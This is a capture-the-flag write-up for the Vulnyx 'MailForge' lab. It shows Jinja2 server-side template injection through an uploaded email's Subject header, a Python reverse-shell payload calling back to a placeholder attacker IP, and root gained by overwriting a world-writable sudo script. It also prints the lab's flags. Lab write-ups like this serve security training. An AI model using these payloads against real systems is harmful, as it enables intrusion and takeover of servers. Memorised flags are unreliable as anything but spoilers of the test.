# Vulnyx: MailForge

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Jarbou3` |
| **Tools used** | `nmap` · `ffuf` · `curl` · `nc` |
| **Tags** | `#SSTI` `#Jinja2` `#RCE` `#SudoAbuse` `#WritableScript` |
| **URL** | https://vulnyx.com/machines/ |

A Flask app on port 5000 lets `.eml` files be uploaded and previewed — and the preview renders the email's `Subject` field through a Jinja2 template with no sanitization, giving Server-Side Template Injection. Walking from a commonly-accessible template variable back to Python's `os` module is enough to get command execution and a reverse shell. Root comes from a `sudo`-permitted cleanup script that's writable by the current user.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn mailforge.nyx

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 08:00:27:21:72:E7 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **5000** — the default port for Flask's development server, a strong hint at the tech stack. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,80,5000 -sCV mailforge.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.2 (protocol 2.0)
80/tcp   open  http    nginx
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5000/tcp open  http    Werkzeug httpd 3.1.4 (Python 3.12.12)
|_http-title: MailForge - Email Preview Service
|_http-server-header: Werkzeug/3.1.4 Python/3.12.12
MAC Address: 08:00:27:21:72:E7 (Oracle VirtualBox virtual NIC)
```

Port 5000 confirms it: a Werkzeug/Python server titled "MailForge - Email Preview Service" — a Flask app, and the obvious place to focus.

### Web Enumeration

```
http://mailforge.nyx/
```

<img src="../Images/mailforge/Pasted image 20260801120617.png"/>

```
http://mailforge.nyx:5000
```

<img src="../Images/mailforge/Pasted image 20260801120631.png"/>

Content scans against both servers turn up nothing beyond the app itself, so attention shifts to its upload-and-preview feature:

```bash
$ ffuf -u http://mailforge.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic -fw 5
$ ffuf -u http://mailforge.nyx:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic
```

## Initial Access

### SSTI in the Email Preview

The app on port 5000 accepts `.eml` file uploads with a preview feature — worth testing whether any of the email's own fields get rendered through a template rather than displayed as plain text. A test file targets the `Subject` header with a classic SSTI probe:

```
$ cat email_id.eml
From: {{7*7}}
To: test@mailforge.nyx
Subject: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

This is a test
```

The `config.__class__.__init__.__globals__['os']` chain is a well-known Jinja2 sandbox-escape pattern: `config` is commonly accessible inside a Flask app's template context, and walking through its class, its `__init__`, and that method's `__globals__` reaches back into the module's global namespace — where `os` sits, fully importable, even when a naive filter blocks the literal string `import os`.

```bash
$ curl -X POST http://mailforge.nyx:5000/upload -F "file=@email_id.eml"
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

```bash
$ curl http://mailforge.nyx:5000/preview/email_id.eml

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Preview - email_id.eml</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #333; }
        .email-header { background: #f8f9fa; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .email-header div { margin-bottom: 8px; }
        .email-header strong { display: inline-block; width: 60px; }
        .back-link { display: inline-block; margin-bottom: 20px; }
        .back-link a { color: #007bff; text-decoration: none; }
        .back-link a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="back-link">
            <a href="/">← Back to Email List</a>
        </div>
        <h1>Email Preview</h1>
        <div class="email-header">
            <div><strong>Subject:</strong> uid=1000(mailforge) gid=1000(mailforge) groups=1000(mailforge)</div>
            <div><strong>From:</strong> { data.from }</div>
            <div><strong>To:</strong> { data.to }</div>
        </div>
        <p><em>This is a preview of how the email will appear to recipients.</em></p>
    </div>
</body>
</html>
```

The `Subject` field comes back as the output of `id` rather than the literal payload — confirming the template renders it server-side, and that the `os` chain reaches command execution:

<img src="../Images/mailforge/Pasted image 20260801120754.png"/>

### Shell as mailforge

With `id` confirming code execution, the same technique triggers a reverse shell instead:

```
From: test@mailforge.nyx
To: test@mailforge.nyx
Subject: {{config.__class__.__init__.__globals__['os'].popen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'<ATTACKER_IP>\',<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"').read()}}

This is a test
```

```bash
$ curl -X POST http://mailforge.nyx:5000/upload -F "file=@email_shell.eml"
$ curl http://mailforge.nyx:5000/preview/email_shell.eml
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [mailforge.nyx] 54648
bash: cannot set terminal process group (2417): Not a tty
bash: no job control in this shell
mailforge:/opt/mailforge/app$ id
uid=1000(mailforge) gid=1000(mailforge) groups=1000(mailforge)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
mailforge:/opt/mailforge/app$ ls -l /home
total 4
drwxr-sr-x    2 mailforge mailforge     4096 Dec 14  2025 mailforge
mailforge:/opt/mailforge/app$ ls -l /home/mailforge
total 4
-r--------    1 mailforge mailforge       32 Dec 13  2025 user.txt
mailforge:/opt/mailforge/app$ cat /home/mailforge/user.txt
9e142552596f94cbeb70d01e4536f14c
```

> **User flag:** `9e142552596f94cbeb70d01e4536f14c`

## Privilege Escalation

### A Writable Cleanup Script

```bash
mailforge:/opt/mailforge/app$ sudo -l
Matching Defaults entries for mailforge on mailforge:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for mailforge:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User mailforge may run the following commands on mailforge:
    (root) NOPASSWD: /usr/local/bin/cleaner.sh
mailforge:/opt/mailforge/app$ ls -l /usr/local/bin/cleaner.sh
-rwxrwxrwx    1 root     root            38 Dec 14  2025 /usr/local/bin/cleaner.sh
mailforge:/opt/mailforge/app$ cat /usr/local/bin/cleaner.sh
#!/bin/sh
rm -rf /opt/mailforge/tmp/*
```

The current user can run `cleaner.sh` as root via `sudo`, and the script itself is world-writable (`-rwxrwxrwx`) — enough to replace its contents entirely with something that just spawns a privileged shell:

```bash
mailforge:/opt/mailforge/app$ echo '#!/bin/bash' > /usr/local/bin/cleaner.sh
mailforge:/opt/mailforge/app$ echo 'bash -p' >> /usr/local/bin/cleaner.sh
mailforge:/opt/mailforge/app$ cat /usr/local/bin/cleaner.sh
#!/bin/bash
bash -p
```

```bash
mailforge:/opt/mailforge/app$ sudo /usr/local/bin/cleaner.sh
mailforge:/opt/mailforge/app# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
mailforge:/opt/mailforge/app# ls -l /root
total 4
-r--------    1 root     root            32 Dec 13  2025 root.txt
mailforge:/opt/mailforge/app# cat /root/root.txt
2c4e4e62f7bd23207b2af8601bcd38ab
```

> **Root flag:** `2c4e4e62f7bd23207b2af8601bcd38ab`

## Takeaways

- Any feature that renders user-supplied content through a template engine — an email preview included — is a potential SSTI surface, especially in Python web apps built on Jinja2, Flask, or similar.
- The `__class__.__init__.__globals__` chain (or close variants of it) is worth trying whenever a naive filter blocks obvious keywords like `import` or `exec` — it reaches Python's internals through object introspection instead of a direct call.
- A `sudo` rule granting a script as root is only as safe as that script's own file permissions — a script owned by root but writable by the invoking user is equivalent to full root access, since its contents can be swapped for anything before it runs.